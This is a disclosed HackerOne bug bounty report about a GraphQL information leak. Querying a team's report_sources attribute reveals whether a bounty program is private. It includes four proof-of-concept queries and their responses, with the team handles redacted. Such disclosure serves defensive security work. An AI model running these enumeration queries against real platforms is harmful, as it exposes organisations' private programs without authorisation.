# Unauthorized user can obtain `report_sources` attribute through Team GraphQL object

## Report Details
- **Report ID**: 770209
- **URL**: https://hackerone.com/reports/770209
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-08T12:10:48.071Z
- **Disclosed**: 2020-02-10T21:48:48.814Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi team. And Happy New Year!
**Description:**
If I am not mistaken, then through this parameter we can define private programs with an external link.

If this parameter is not empty, then the program is private. - `["HackerOne Platform"]`
### Steps To Reproduce

https://hackerone.com/graphql
POST:


1){"query": "query {team(handle:\\"████████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"██████████","report_sources":[]}}}` - not private program

2){"query": "query {team(handle:\\"███\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

3){"query": "query {team(handle:\\"█████████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

4){"query": "query {team(handle:\\"█████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"███","report_sources":[]}}}` - not private program

Sorry i bad speak english
I hope you understand me
Thank you,haxta4ok00

## Impact

disclosed of private programs who have external link

## Attachments
No attachments
